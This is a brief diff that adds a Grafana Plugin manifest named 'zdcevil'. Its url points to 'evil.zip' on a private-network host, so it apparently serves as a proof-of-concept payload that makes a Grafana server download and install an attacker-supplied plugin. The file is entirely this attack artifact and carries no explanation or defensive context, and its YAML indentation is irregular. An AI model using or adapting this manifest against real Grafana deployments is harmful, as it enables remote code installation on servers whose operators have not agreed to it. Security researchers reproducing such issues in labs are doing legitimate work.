@@ -1,0 +1,8 @@
+apiVersion: plugins.grafana.app/v0alpha1
+  kind: Plugin
+  metadata:
+    name: zdcevil
+  spec: 
+    id: zdcevil
+    version: "1.0.0"
+    url: "http://172.18.0.1:8099/evil.zip"
